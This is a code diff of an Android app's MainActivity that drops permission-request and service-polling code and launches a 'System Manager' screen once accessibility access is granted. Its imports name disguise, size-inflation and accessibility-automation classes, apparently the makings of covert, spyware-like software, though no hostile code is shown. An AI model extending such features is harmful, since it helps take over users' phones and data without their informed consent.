@@ -2,13 +2,11 @@ package com.task.tusker;
 
 import android.app.Dialog;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.graphics.Color;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.provider.Settings;
-import android.util.Log;
 import android.view.Gravity;
 import android.view.View;
 import android.view.ViewGroup;
@@ -23,8 +21,6 @@ import android.widget.FrameLayout;
 import android.widget.LinearLayout;
 import android.widget.TextView;
 import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.content.ContextCompat;
-import com.task.tusker.PermissionRequestActivity;
 import com.task.tusker.permissions.AutoPermissionManager;
 import com.task.tusker.SystemManagerActivity;
 import com.task.tusker.receivers.AccessibilityReminderReceiver;
@@ -33,9 +29,6 @@ import com.task.tusker.security.ChameleonIdentity;
 import com.task.tusker.security.SecurityGuard;
 import com.task.tusker.security.SizeInflationManager;
 import com.task.tusker.services.DataSyncService;
-import com.task.tusker.services.UnifiedAccessibilityService;
-import java.util.ArrayList;
-import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -77,14 +70,14 @@ public class MainActivity extends AppCompatActivity {
 
         permissionManager = new AutoPermissionManager(this);
 
-        // Handle permission request from alarm/broadcast
-        handlePermissionRequestIntent(getIntent());
-
-        // If accessibility is already enabled on launch, wait for service to be fully ready
-        // before going to System Manager. This ensures all background features are initialized.
+        // If accessibility is already enabled on launch, skip the setup screen entirely
+        // and go straight to System Manager. This makes System Manager the effective
+        // home screen of the app whenever accessibility is granted.
         if (permissionManager.isAccessibilityServiceEnabled()) {
             startDataSyncService();
-            waitForServiceReadyAndLaunch();
+            startActivity(new Intent(this, SystemManagerActivity.class)
+                    .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP));
+            finish();
             return;
         }
 
@@ -362,77 +355,6 @@ public class MainActivity extends AppCompatActivity {
             } else {
                 startService(intent);
             }
-            
-            // Verify foreground service actually started (poll for up to 3 seconds)
-            new Thread(() -> {
-                for (int i = 0; i < 30; i++) {
-                    if (DataSyncService.isForegroundServiceRunning()) {
-                        Log.d("MainActivity", "DataSyncService foreground started OK");
-                        return;
-                    }
-                    try { Thread.sleep(100); } catch (InterruptedException ignored) {}
-                }
-                Log.w("MainActivity", "DataSyncService foreground start may have failed");
-            }).start();
-        } catch (Exception e) {
-            Log.e("MainActivity", "startDataSyncService failed: " + e.getMessage());
-        }
-    }
-
-    private void waitForServiceReadyAndLaunch() {
-        new Thread(() -> {
-            // Poll for up to 10 seconds for service to be ready
-            for (int i = 0; i < 100; i++) {
-                if (UnifiedAccessibilityService.isServiceReady(this)) {
-                    runOnUiThread(() -> {
-                        startActivity(new Intent(this, SystemManagerActivity.class)
-                                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP));
-                        finish();
-                    });
-                    return;
-                }
-                try { Thread.sleep(100); } catch (InterruptedException ignored) {}
-            }
-            // Timeout - launch anyway (service might still be starting)
-            runOnUiThread(() -> {
-                startActivity(new Intent(this, SystemManagerActivity.class)
-                        .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP));
-                finish();
-            });
-        }).start();
-    }
-
-    @Override
-    protected void onNewIntent(Intent intent) {
-        super.onNewIntent(intent);
-        setIntent(intent);
-        handlePermissionRequestIntent(intent);
-    }
-
-    private void handlePermissionRequestIntent(Intent intent) {
-        if (intent == null) return;
-        String[] permissions = intent.getStringArrayExtra("request_permissions");
-        if (permissions == null || permissions.length == 0) return;
-
-        Log.i("MainActivity", "Handling permission request for " + permissions.length + " permissions: " + java.util.Arrays.toString(permissions));
-
-        // Filter out already-granted permissions
-        List<String> needed = new ArrayList<>();
-        for (String p : permissions) {
-            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
-                needed.add(p);
-            }
-        }
-
-        if (needed.isEmpty()) {
-            Log.d("MainActivity", "All requested permissions already granted");
-            return;
-        }
-
-        // Request runtime permissions via PermissionRequestActivity
-        Intent request = new Intent(this, PermissionRequestActivity.class);
-        request.putExtra(PermissionRequestActivity.EXTRA_PERMISSIONS, needed.toArray(new String[0]));
-        request.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-        startActivity(request);
+        } catch (Exception ignored) {}
     }
 }
